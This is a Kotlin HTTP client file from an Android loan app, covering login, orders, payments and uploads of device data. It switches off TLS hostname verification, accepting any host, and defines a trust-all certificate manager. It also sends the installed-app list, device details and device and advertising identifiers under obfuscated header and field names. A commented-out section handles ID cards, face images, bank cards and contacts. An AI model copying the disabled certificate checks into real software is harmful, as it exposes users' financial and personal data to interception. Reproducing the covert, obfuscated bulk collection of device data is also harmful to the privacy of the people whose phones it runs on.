package com.credit.bridge.remote

import RequestOrderUpdateBody
import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageInfo
import android.os.Build
import android.provider.Settings
import android.text.TextUtils
import androidx.annotation.RequiresApi
import androidx.annotation.RequiresPermission
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerLib
import com.credit.bridge.R
import com.credit.bridge.content.AndroidBus
import com.credit.bridge.content.Contants
import com.credit.bridge.remote.bean.DeviceInfo
import com.credit.bridge.remote.body.RequestHomeInfoBody
import com.credit.bridge.remote.body.RequestInstalledPackageBody
import com.credit.bridge.remote.body.RequestOrderDetailsBody
import com.credit.bridge.remote.body.RequestOrderListBody
import com.credit.bridge.remote.body.RequestSubmitOrderBody
import com.credit.bridge.remote.body.RequestVerifyCodeBody
import com.credit.bridge.remote.body.RequestVoiceCodeBody
import com.credit.bridge.remote.event.AllProductListResponseEvent
import com.credit.bridge.remote.event.BResponseEvent
import com.credit.bridge.remote.event.CheckCollectDataStatusResponseEvent
import com.credit.bridge.remote.event.CheckUploadStatusResponseEvent
import com.credit.bridge.remote.event.HomeInfoResponseEvent
import com.credit.bridge.remote.event.LoginResponseEvent
import com.credit.bridge.remote.event.OrderDetailsResponseEvent
import com.credit.bridge.remote.event.OrderListResponseEvent
import com.credit.bridge.remote.event.OrderUpdateResponseEvent
import com.credit.bridge.remote.event.PaymentLinkDetailsResponseEvent
import com.credit.bridge.remote.event.PaymentLinkResponseEvent
import com.credit.bridge.remote.event.PrivacyPolicyUrlResponseEvent
import com.credit.bridge.remote.event.RequestZipDataBody
import com.credit.bridge.remote.event.SubmitOrderResponseEvent
import com.credit.bridge.remote.event.UploadInstalledPackageListResponseEvent
import com.credit.bridge.remote.event.UploadSystemResponseEvent
import com.credit.bridge.remote.event.VerifyCodeResponseEvent
import com.credit.bridge.remote.event.VoiceCodeResponseEvent
import com.credit.bridge.remote.response.AllProductListResponse
import com.credit.bridge.remote.response.BResponse
import com.credit.bridge.remote.response.CheckCollectDataStatusResponse
import com.credit.bridge.remote.response.CommonBoolResponse
import com.credit.bridge.remote.response.CommonResponse
import com.credit.bridge.remote.response.HomeInfoResponse
import com.credit.bridge.remote.response.LoginResponse
import com.credit.bridge.remote.response.OrderDetailsResponse
import com.credit.bridge.remote.response.OrderListResponse
import com.credit.bridge.remote.response.OrderUpdateResponse
import com.credit.bridge.ui.App
import com.credit.bridge.util.DeviceInfoUtil
import com.credit.bridge.util.SystemDataUtils
import com.google.android.gms.common.internal.service.Common
import com.google.gson.Gson
import okhttp3.OkHttpClient
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.TimeUnit
import javax.net.ssl.SSLContext
import javax.net.ssl.SSLSocketFactory
import javax.net.ssl.X509TrustManager
import javax.net.ssl.TrustManager
import java.security.cert.CertificateException
import java.security.cert.X509Certificate
import kotlin.jvm.java

object HttpClient {

    private val HTTP_RESPONSE_CACHE = 10485760L
    private val HTTP_TIMEOUT_MS = 60 * 1000
    private var mHttpApi: HttpApi? = null
    private var httpClient: OkHttpClient? = null
    private var mBus: AndroidBus? = null
    var authorization: String? = null
    var dispatchClient: DispatchClient? = null
    var severRootUrl: String? = null


    fun init(context: Context, bus: AndroidBus) {
        severRootUrl = Contants.BASE_SERVER_URL
        initOkHTTP(context)
        mBus = bus
        dispatchClient = DispatchClient(context, mBus!!)
    }


    private fun initOkHTTP(context: Context) {
        httpClient = provideOkHttpClient(context)
        initHttpClientApi()
    }

    private fun provideOkHttpClient(context: Context): OkHttpClient {
        val loggingInterceptor = HttpLoggingInterceptor()
        loggingInterceptor.level = HttpLoggingInterceptor.Level.BODY
        val builder = OkHttpClient.Builder()
        builder.apply {
            connectTimeout(HTTP_TIMEOUT_MS.toLong(), TimeUnit.MILLISECONDS)
            readTimeout(HTTP_TIMEOUT_MS.toLong(), TimeUnit.MILLISECONDS)
            addInterceptor(loggingInterceptor)
            addInterceptor { chain ->
                val original = chain.request()
                val request = original.newBuilder()
                chain.proceed(request.build())
            }
            createInsecureSslSocketFactory()
            builder.hostnameVerifier { hostname, session -> true }
        }
        return builder.build()
    }
    private fun createInsecureSslSocketFactory(): SSLSocketFactory {
        try {
            val context = SSLContext.getInstance("TLS")
            val permissive = object : X509TrustManager {
                @Throws(CertificateException::class)
                override fun checkClientTrusted(certs: Array<X509Certificate>, authType: String) {
                    checkServerTrusted(certs, authType)
                }

                @Throws(CertificateException::class)
                override fun checkServerTrusted(chain: Array<X509Certificate>, authType: String) {
                }

                override fun getAcceptedIssuers(): Array<X509Certificate> {
                    return arrayOf()
                }
            }
            context.init(null, arrayOf<TrustManager>(permissive), null)
            return context.socketFactory
        } catch (e: Exception) {
            throw AssertionError(e)
        }

    }

    private fun initHttpClientApi() {
        try {
            val restAdapter = Retrofit.Builder()
                .client(httpClient!!)
                .baseUrl(severRootUrl!!)
                //.baseUrl(mSession!!.baseServerURL)
                .addConverterFactory(GsonConverterFactory.create())
                .build()

            mHttpApi = restAdapter.create(HttpApi::class.java)
        } catch (E: Throwable) {

        }

    }

    private fun getHeaders(mContext: Context): HashMap<String, String> {

        val packageInfo: PackageInfo = mContext.packageManager.getPackageInfo(mContext.packageName, 0)
        val headerMap: HashMap<String, String> = HashMap<String, String>()

        headerMap["Accept"] = "application/json"
        headerMap["X-SGIYRD-FPEQWUXJY"] = ""
        headerMap["X-WRK-ZZPB"] = CacheManager.smsCode
        headerMap["X-AWNMXNKZ-DPCQJ"] = ""
        headerMap["X-FWNP-XRNBH"] = CacheManager.token
        headerMap["X-EXOGETRG-TQQNENCUQU"] = ""//firebase
        headerMap["X-HNOSNMBQ-UOZ"] = if (TextUtils.isEmpty(CacheManager.afChannel)) "Organic" else CacheManager.afChannel
        headerMap["X-TQWHMBK-YGR"] = ""
        headerMap["X-LBQ-PGNOCIG"] = packageInfo.versionCode.toString()
        headerMap["X-NECBSE-ZNHI"] = ""
        headerMap["X-TXCDBAD-OQ"] = SystemDataUtils.getAndroidId()
        headerMap["X-NXH-IZSGJQX-XCON"] = mContext.packageName
        headerMap["X-KY-CY"] =
            AppsFlyerLib.getInstance().getAppsFlyerUID(App.instance) ?: ""
        headerMap["X-IZYEAW-WLXX"] = ""
        headerMap["X-JAKXSOJABRG"] = ""
        headerMap["X-HNH-ON"] = ""
        headerMap["X-HT-UB"] = App.instance.googleAdIdResult?.gaid ?: ""
        headerMap["X-WFS-YAJC"] = mContext.resources.getString(R.string.app_name)
        headerMap["X-ILWKWSQO"] = CacheManager.afChannel

        return headerMap
    }

    fun sendVerifyCode(mContext: Context, mobile: String, type: String) {
        val body = RequestVerifyCodeBody()
        body.qfve = type
        body.sucbzl = mobile
        val call = mHttpApi!!.requestPostVerifyCode(getHeaders(mContext), Contants.URL_SEND_SMS, body)
        dispatchClient?.enqueue(call, CommonResponse::class.java, VerifyCodeResponseEvent::class.java)
    }

    fun getVoiceCode(mContext: Context, mobile: String) {

        val body = RequestVoiceCodeBody()
        body.sucbzl = mobile
        val call = mHttpApi!!.requestPostVoiceCode(getHeaders(mContext), Contants.URL_GET_VOICE, body)
        dispatchClient?.enqueue(call, CommonResponse::class.java, VoiceCodeResponseEvent::class.java)
    }

    fun login(mContext: Context, mobile: String) {
        val formMap: HashMap<String, Any> = HashMap()
        formMap[RequestParams.mobile_login] = mobile
        val call = mHttpApi!!.requestPost1(getHeaders(mContext), RequestParams.URL_LOGIN_SMS, formMap)
        dispatchClient!!.enqueue(call, LoginResponse::class.java, LoginResponseEvent::class.java)
    }

    fun checkCollectDataStatus(mContext: Context) {
        val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_COLLECT_DATA_INTEGRITY)
        dispatchClient!!.enqueue(call, CheckCollectDataStatusResponse::class.java,
            CheckCollectDataStatusResponseEvent::class.java)
    }



    fun eventReport(mContext: Context, tag: String, actionType: String, status: String, reportType: String = "user") {

        val eventType =  HashMap<String, Any>()
        eventType[tag] = ""
        AppsFlyerLib.getInstance().logEvent(mContext, tag, eventType)

        val formMap: HashMap<String, Any> = HashMap()
        formMap[RequestParams.actionType] = actionType
        formMap[RequestParams.status] = status
        formMap[RequestParams.reportType] = reportType
        val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_POINT_REPORT, formMap)
        dispatchClient!!.enqueue(call, BResponse::class.java, BResponseEvent::class.java)
    }

    fun getHomeInfo(mContext: Context, body: RequestHomeInfoBody) {

        val call = mHttpApi!!.requestPostHomeInfo(getHeaders(mContext), Contants.URL_HOME, body)
        dispatchClient!!.enqueue(call, HomeInfoResponse::class.java, HomeInfoResponseEvent::class.java)
    }

    @SuppressLint("HardwareIds")
    fun checkUploadStatus(mContext: Context) {
        val formMap: HashMap<String, Any> = HashMap()
        formMap[Contants.imei_p] = Settings.Secure.getString(App.instance.contentResolver, Settings.Secure.ANDROID_ID)
        val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_CHECK_UPLOAD_STATUS, formMap)
        dispatchClient!!.enqueue(call, CommonBoolResponse::class.java,
            CheckUploadStatusResponseEvent::class.java)
    }

    fun getPrivacyPolicyUrl(mContext: Context) {

        val formMap: HashMap<String, Any> = HashMap()
        formMap["alfekfdvov"] = "declaration"
        val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_PRIVTE,formMap)
        dispatchClient?.enqueue(call, CommonResponse::class.java, PrivacyPolicyUrlResponseEvent::class.java)
    }

    @SuppressLint("HardwareIds")
    fun uploadInstalledPackageList(mContext: Context) {

        val installedPackageBody = RequestInstalledPackageBody(
            protocolName = "INSTALLED_APP",
            data = SystemDataUtils.getInstalledAppList(mContext)
        )
        val jsonList = Gson().toJson(installedPackageBody)
        val zipString = SystemDataUtils.getZipData(jsonList)
        val requestZipBody = RequestZipDataBody()
        requestZipBody.sucbzl = CacheManager.mobile
        requestZipBody.xjevovy = zipString
        requestZipBody.gefl = DeviceInfoUtil.getAndroidId()
        val call = mHttpApi!!.requestPostZipData(getHeaders(mContext), Contants.URL_GZIP,requestZipBody)
        dispatchClient!!.enqueue(call, CommonResponse::class.java,
            UploadInstalledPackageListResponseEvent::class.java)
    }


    @RequiresPermission(allOf = [Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.READ_PHONE_STATE])
    @SuppressLint("HardwareIds")
    fun uploadSystemInfo(mContext: Context) {
        var messageBody = RequestInstalledPackageBody(protocolName = "DEVICE_INFO" , data = SystemDataUtils.getDeviceInfo(mContext))
        val json = Gson().toJson(messageBody)
        val zipString = SystemDataUtils.getZipData(json)
        var requestZipBody = RequestZipDataBody()
        requestZipBody.sucbzl = CacheManager.mobile
        requestZipBody.xjevovy = zipString
        requestZipBody.gefl = Settings.Secure.getString(App.instance.contentResolver, Settings.Secure.ANDROID_ID)
        val call = mHttpApi!!.requestPostZipData(getHeaders(mContext), Contants.URL_GZIP,requestZipBody)
        dispatchClient!!.enqueue(call, CommonResponse::class.java, UploadSystemResponseEvent::class.java)
    }

    fun fetchOrderList(mContext: Context, type: String, flag: String) {

        val orderBody = RequestOrderListBody()
        orderBody.qfve = type

        val call = mHttpApi!!.requestPostOrderList(getHeaders(mContext), Contants.URL_ORDER_LIST, orderBody)
        dispatchClient!!.enqueue(call, OrderListResponse::class.java, OrderListResponseEvent::class.java,flag)
    }

    fun getPaymentLink(mContext: Context, extensionStatus : Boolean,orderId : String, type : Int) {

        val formMap: HashMap<String, Any> = HashMap()
        formMap[Contants.extension] = extensionStatus
        formMap[Contants.loanAppId] = orderId
        val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_GET_DEPOSIT,formMap)
        if (type == 1) {
            dispatchClient!!.enqueue(call, CommonResponse::class.java, PaymentLinkResponseEvent::class.java)
        }else if (type == 2) {
            dispatchClient!!.enqueue(call, CommonResponse::class.java,
                PaymentLinkDetailsResponseEvent::class.java)
        }
    }

    fun getOrderDetails(mContext: Context, body: RequestOrderDetailsBody, flag: String) {

        val call = mHttpApi!!.requestPostOrderDetails(getHeaders(mContext), Contants.URL_ORDER_DETAIL, body)
        dispatchClient!!.enqueue(call, OrderDetailsResponse::class.java, OrderDetailsResponseEvent::class.java, flag)
    }


    fun getOrderUpdateInfo(mContext: Context, extensionPeriod: Int, loanAppId: Int) {

        val body = RequestOrderUpdateBody()
        body.nhtfrspjg = loanAppId
        body.tcxjwmpdlhudlcu = extensionPeriod

        val call = mHttpApi!!.requestPostOrderUpdate(getHeaders(mContext), Contants.URL_APPLY_DETAIL, body)
        dispatchClient!!.enqueue(call, OrderUpdateResponse::class.java, OrderUpdateResponseEvent::class.java)
    }

    fun getAllProductList(mContext: Context) {

        val call = mHttpApi!!.requestPost(getHeaders(mContext), Contants.URL_GET_PRODUCTION_INFO)
        dispatchClient!!.enqueue(call, AllProductListResponse::class.java,
            AllProductListResponseEvent::class.java)
    }

    fun submitOrder(mContext: Context, requestBody: ArrayList<RequestSubmitOrderBody>, flag: String) {

        val call = mHttpApi!!.requestPostSubmitOrder(getHeaders(mContext), Contants.URL_CREATE_ORDER, requestBody)
        dispatchClient!!.enqueue(call, BResponse::class.java, SubmitOrderResponseEvent::class.java, flag)
    }


    /*

    fun ocrPanNumber(mContext: Context) {

        val body = RequestOcrNumberBody()
        body.qfve = "PAN"
        val call = mHttpApi!!.ocrPanNumber(getHeaders(mContext), Contants.URL_OCR_NUMBER, body)
        dispatchClient?.enqueue(call, IntResponse::class.java, OcrPanNumberResponseEvent::class.java)
    }

    fun ocrFaceNumber(mContext: Context) {

        val body = RequestOcrNumberBody()
        body.qfve = "FACE"
        val call = mHttpApi!!.ocrPanNumber(getHeaders(mContext), Contants.URL_OCR_NUMBER, body)
        dispatchClient?.enqueue(call, IntResponse::class.java, OcrFaceNumberResponseEvent::class.java)
    }

    fun ocrPan(mContext: Context, url: String) {

        val body = RequestOcrBody()
        body.fwadagpin = url
        val call = mHttpApi!!.ocrPan(getHeaders(mContext), Contants.URL_SAVE_PAN_RESULT, body)
        dispatchClient?.enqueue(call, OcrResponse::class.java, OcrPanResponseEvent::class.java)
    }

    fun ocrFace(mContext: Context, url: String) {

        val body = RequestOcrBody()
        body.fwadagpin = url
        val call = mHttpApi!!.ocrPan(getHeaders(mContext), Contants.URL_UPLOAD_FACE_IMAGE, body)
        dispatchClient?.enqueue(call, StringResponse::class.java, OcrFaceResponseEvent::class.java)
    }

    fun getPrivateUrl(mContext: Context) {

        val formMap: HashMap<String, Any> = HashMap()
        formMap["alfekfdvov"] = "policy"
        val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_PRIVTE,formMap)
        dispatchClient?.enqueue(call, StringResponse::class.java, PrivateUrlResponseEvent::class.java)
    }



    fun getBankInfo(mContext: Context) {

        val call = mHttpApi!!.requestGet(getHeaders(mContext), Contants.URL_GET_BANK_INFO)
        dispatchClient?.enqueue(call, BankResponse::class.java, BankInfoResponseEvent::class.java)
    }

    fun userCredit(mContext: Context) {

        val call = mHttpApi!!.requestGet(getHeaders(mContext), Contants.URL_USER_CREDIT)
        dispatchClient?.enqueue(call, UserCreditResponse::class.java, UserCreditResponseEvent::class.java)
    }

    fun postBankInfo(mContext: Context, bankName: String, cardNo: String,cardNoSecond: String ,bankCode: String,code: String) {
        val body = RequestBankBody()
        body.aosqii = cardNo
        body.fikvylg = bankName
        body.wqumwrph = bankCode
        body.pxcvycbjwxnn = cardNoSecond
        body.kutc = code
        val call = mHttpApi!!.postBankInfo(getHeaders(mContext), Contants.URL_CHANGE_BACK, body)
        dispatchClient?.enqueue(call, StringResponse::class.java, QuestionThreeResponseEvent::class.java)
    }

    fun saveQuestionOne(mContext: Context, childrenNumber: String, email: String, employmentStatues: String, lastEducation: String, maritalStatus: String,
                        monthlyIcome: String, whatsAppAccount: String) {

        val personalInfo = PersonalInfo()
        personalInfo.hkalauhobxroaq = childrenNumber
        personalInfo.zztal = email
        personalInfo.uhynjkkijdcmdvhvl = employmentStatues
        personalInfo.ufhjanixbqltq = lastEducation
        personalInfo.wrxrgcbckiewb = maritalStatus
        personalInfo.utmytmlcmuso = monthlyIcome
        personalInfo.egwgclynecudnbh = whatsAppAccount
        val call = mHttpApi!!.requestPutPersonalInfoOne(getHeaders(mContext), Contants.URL_PRESONAL_INFO, personalInfo)

        dispatchClient?.enqueue(call, StringResponse::class.java, QuestionOneResponseEvent::class.java)
    }

    fun saveQuestionTwo(mContext: Context, body: ArrayList<RequestContactBody>) {

        val call = mHttpApi!!.requestPutPersonalInfoTwo(getHeaders(mContext), Contants.URL_CONTACT, body)
        dispatchClient?.enqueue(call, StringResponse::class.java, QuestionTwoResponseEvent::class.java)
    }

    fun savePanFour(mContext: Context, panNumber: String, fullName: String, birthday: String, gender: String) {

        val panBody = RequestPanBody()
        panBody.bcikobrx = fullName
        panBody.gscxhjjfy = panNumber
        panBody.ticgsg = gender
        panBody.zcpoxpzb = birthday
        val call = mHttpApi!!.requestPutPan(getHeaders(mContext), Contants.URL_SAVE_CARD_RESULT, panBody)

        dispatchClient?.enqueue(call, StringResponse::class.java, QuestionFourPanResponseEvent::class.java)
    }



    fun getOrderBank(mContext: Context, cardNo: String) {

        val orderBody = RequestOrderBankBody()
        orderBody.aosqii = cardNo
        val call = mHttpApi!!.postOrderBankList(getHeaders(mContext), Contants.URL_ORDER_BANK, orderBody)
        dispatchClient!!.enqueue(call, OrderListResponse::class.java, OrderListBankResponseEvent::class.java)
    }


    fun getPayListBankUrl(mContext: Context,extension : Boolean,loanAppId : String) {

        val formMap: HashMap<String, Any> = HashMap()
        formMap[Contants.extension] = extension
        formMap[Contants.loanAppId] = loanAppId
        val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_GET_DEPOSIT,formMap)
        dispatchClient!!.enqueue(call, StringResponse::class.java,
            UrlPayListBankResponseEvent::class.java)
    }


    fun getOssParam(mContext: Context) {
        val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_GET_OSS)
        dispatchClient!!.enqueue(call, OssParamResponse::class.java, OssParamResponseEvent::class.java)
    }

    fun getOssParamFace(mContext: Context) {
        val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_GET_OSS)
        dispatchClient!!.enqueue(call, OssParamResponse::class.java, OssParamResponseFaceEvent::class.java)
    }



    fun logout(mContext: Context) {

        val formMap: HashMap<String, Any> = HashMap()
        //formMap[Contants.type] = type

        val call = mHttpApi!!.requestPost(getHeaders(mContext), Contants.URL_LOGOUT, formMap)
        dispatchClient!!.enqueue(call, BResponse::class.java, LogoutResponseEvent::class.java)
    }

    fun feedback(mContext: Context,body: RequestFeedbackBody) {

        val call = mHttpApi!!.feedback(getHeaders(mContext), Contants.URL_FEEDBACK, body)
        dispatchClient!!.enqueue(call, BResponse::class.java, FeedbackResponseEvent::class.java)
    }


    fun feedbackConfig(mContext: Context) {
        val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_FEEDBACK_CONFIG)
        dispatchClient!!.enqueue(call, FeedbackConfigResponse::class.java, FeedbackConfigResponseEvent::class.java)
    }





     *//*



    *//**
     *  apply order
     *//*




    *//**
     * login
     *//*
    fun pointReport(mContext: Context, actionType: String, comment: String, reportType: String) {

        val formMap: HashMap<String, Any> = HashMap()
        formMap[Contants.actionType] = actionType
        formMap[Contants.comment] = comment
        formMap[Contants.reportType] = reportType
        val call = mHttpApi!!.requestGetAuth1(getHeaders(mContext), Contants.URL_POINT_REPORT, formMap)
        dispatchClient!!.enqueue(call, BResponse::class.java, ResponseEvent::class.java)
    }*/

}
